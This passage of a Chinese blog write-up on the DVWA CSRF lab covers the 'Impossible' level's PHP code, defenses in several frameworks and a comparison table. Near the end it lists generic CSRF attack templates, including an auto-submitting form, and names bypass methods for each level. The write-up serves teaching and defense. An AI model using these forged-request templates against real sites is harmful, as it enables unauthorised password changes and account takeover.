MD5加密当前密码（用于验证）</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转义特殊字符（防SQL注入）</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_new</span>  = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_conf</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_conf</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：验证当前密码是否正确 ★★★</span></span><br><span class="line">    <span class="comment">// 查询数据库，检查当前密码是否匹配</span></span><br><span class="line">    <span class="comment">// 这样即使有CSRF攻击，攻击者也不知道用户的当前密码</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT password FROM `users` WHERE user = &#x27;&quot;</span> . <span class="variable">$_SESSION</span>[ <span class="string">&#x27;username&#x27;</span> ] . <span class="string">&quot;&#x27; AND password = &#x27;<span class="subst">$pass_curr</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) : <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 多重验证 ★★★</span></span><br><span class="line">    <span class="comment">// 条件1：当前密码验证通过</span></span><br><span class="line">    <span class="comment">// 条件2：新密码和确认密码一致</span></span><br><span class="line">    <span class="comment">// mysqli_num_rows($result) - 返回结果行数</span></span><br><span class="line">    <span class="comment">// == 1 表示找到了匹配的密码（当前密码正确）</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$result</span> &amp;&amp; ( <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) ) &amp;&amp; ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 所有验证通过</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// MD5加密新密码</span></span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新密码</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="variable">$_SESSION</span>[ <span class="string">&#x27;username&#x27;</span> ] . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) : <span class="literal">false</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 验证失败</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出错误信息（不透露具体原因，安全实践）</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF Token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><ol>
+<li><strong>POST请求</strong> - 密码不出现在URL</li>
+<li><strong>CSRF Token</strong> - 每次请求必须有效token</li>
+<li><strong>验证当前密码</strong> - 必须知道旧密码才能改</li>
+<li><strong>新密码确认</strong> - 两次输入必须一致</li>
+<li><strong>SQL注入防护</strong> - 使用mysqli_real_escape_string</li>
+<li><strong>错误信息模糊</strong> - 不透露具体失败原因</li>
+</ol>
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>攻击者的困境：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CSRF攻击需要：</span><br><span class="line">1. 有效的CSRF Token ✓（可能通过XSS获取）</span><br><span class="line">2. 知道用户当前密码 ✗（攻击者不知道！）</span><br><span class="line"></span><br><span class="line">即使构造了请求：</span><br><span class="line">POST /dvwa/vulnerabilities/csrf/</span><br><span class="line"><span class="attribute">password_current</span>=?????  ← 攻击者不知道</span><br><span class="line"><span class="attribute">password_new</span>=hacked</span><br><span class="line"><span class="attribute">password_conf</span>=hacked</span><br><span class="line"><span class="attribute">user_token</span>=有效token</span><br><span class="line"></span><br><span class="line">结果：当前密码验证失败，攻击失败</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御层级：</strong></p>
+<ol>
+<li>Token验证 → 防止简单CSRF</li>
+<li>当前密码验证 → 即使有token也无法攻击</li>
+<li>POST请求 → 避免信息泄露</li>
+<li>双重密码确认 → 防止输入错误</li>
+</ol>
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用CSRF-Token（推荐）"><a href="#1-使用CSRF-Token（推荐）" class="headerlink" title="1. 使用CSRF Token（推荐）"></a>1. 使用CSRF Token（推荐）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成token</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在表单中嵌入token</span></span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;csrf_token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf_token&#x27;]; ?&gt;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证token</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>]) || <span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>] !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;CSRF token validation failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-验证Referer头（辅助）"><a href="#2-验证Referer头（辅助）" class="headerlink" title="2. 验证Referer头（辅助）"></a>2. 验证Referer头（辅助）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 严格的Referer检查</span></span><br><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$referer</span>, <span class="string">&quot;https://<span class="subst">$host</span>/&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid referer&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-使用SameSite-Cookie属性"><a href="#3-使用SameSite-Cookie属性" class="headerlink" title="3. 使用SameSite Cookie属性"></a>3. 使用SameSite Cookie属性</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置Cookie时添加SameSite属性</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;session&#x27;</span>, <span class="variable">$value</span>, [</span><br><span class="line">    <span class="string">&#x27;expires&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,      // 只通过HTTPS传输</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span> =&gt; <span class="literal">true</span>,    // 禁止JavaScript访问</span><br><span class="line">    <span class="string">&#x27;samesite&#x27;</span> =&gt; <span class="string">&#x27;Strict&#x27;</span> // 防止CSRF</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>SameSite属性值：</strong></p>
+<ul>
+<li><code>Strict</code> - 完全禁止第三方请求发送Cookie</li>
+<li><code>Lax</code> - GET请求可以，POST请求不行</li>
+<li><code>None</code> - 允许（需配合Secure使用）</li>
+</ul>
+<h4 id="4-验证关键操作密码"><a href="#4-验证关键操作密码" class="headerlink" title="4. 验证关键操作密码"></a>4. 验证关键操作密码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于敏感操作，要求输入当前密码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]) !== <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Current password incorrect&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-使用POST而非GET"><a href="#5-使用POST而非GET" class="headerlink" title="5. 使用POST而非GET"></a>5. 使用POST而非GET</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 所有状态修改操作使用POST</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Method not allowed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Laravel自动提供CSRF保护</span></span><br><span class="line"><span class="comment">// 在表单中添加</span></span><br><span class="line">@csrf</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;_token&quot;</span> value=<span class="string">&quot;&#123;&#123; csrf_token() &#125;&#125;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证（自动）</span></span><br><span class="line"><span class="comment">// Laravel会自动验证所有POST/PUT/DELETE请求的CSRF token</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Django示例"><a href="#Django示例" class="headerlink" title="Django示例"></a>Django示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    <span class="string">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模板中</span></span><br><span class="line">&#123;% csrf_token %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证（自动）</span></span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_protect</span><br><span class="line"></span><br><span class="line"><span class="meta">@csrf_protect</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_view</span>(<span class="params">request</span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><ol>
+<li><p><strong>双重提交Cookie模式</strong></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>在Cookie中设置token</span><br><span class="line"><span class="bullet">- </span>在请求参数中也提交token</span><br><span class="line"><span class="bullet">- </span>服务器对比两者是否一致</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>自定义请求头</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用AJAX时添加自定义头</span></span><br><span class="line"><span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;X-CSRF-Token&#x27;</span>: token,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>验证码（重要操作）</strong></p>
+<ul>
+<li>修改密码</li>
+<li>转账</li>
+<li>删除数据</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>请求方法</td>
+<td>GET</td>
+<td>GET</td>
+<td>GET</td>
+<td>POST</td>
+</tr>
+<tr>
+<td>CSRF Token</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Referer检查</td>
+<td>❌</td>
+<td>✅（弱）</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>验证当前密码</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>SameSite Cookie</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+<tr>
+<td>绕过方法</td>
+<td>直接攻击</td>
+<td>文件名trick</td>
+<td>XSS+CSRF</td>
+<td>几乎不可能</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
+<ol>
+<li><strong>Low难度</strong> - 理解CSRF基本原理</li>
+<li><strong>Medium难度</strong> - 学习Referer绕过</li>
+<li><strong>High难度</strong> - 理解Token机制</li>
+<li><strong>Impossible难度</strong> - 掌握完善的防御</li>
+</ol>
+<p><strong>常用攻击向量：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- GET请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;目标URL&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;目标URL&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;目标URL&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;目标URL&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- POST请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;目标URL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;param&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrf&#x27;</span>).<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御检查清单：</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> 所有状态修改操作使用POST</li>
+<li><input disabled="" type="checkbox"> 实施CSRF Token验证</li>
+<li><input disabled="" type="checkbox"> 设置SameSite Cookie属性</li>
+<li><input disabled="" type="checkbox"> 重要操作验证当前密码</li>
+<li><input disabled="" type="checkbox"> 添加验证码（可选）</li>
+<li><input disabled="" type="checkbox"> 检查Referer（辅助）</li>
+<li><input disabled="" type="checkbox"> 使用HTTPS</li>
+<li><input disabled="" type="checkbox"> 定期更新token</li>
+</ul>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不攻击真实用户</li>
+<li>理解攻击是为了更好防御</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/CSRF_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - CSRF (跨站请求伪造) 攻防练习详解">http://caixuya.github.io/2025/11/20/CSRF_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/File_Inclusion_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - File Inclusion (文件包含) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - File Inclusion (文件包含) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/CSP_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - CSP Bypass 攻防练习详解">
+      DVWA - CSP Bypass 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCSRF%EF%BC%88Cross-Site-Request-Forgery%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是CSRF（Cross-Site Request Forgery）？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 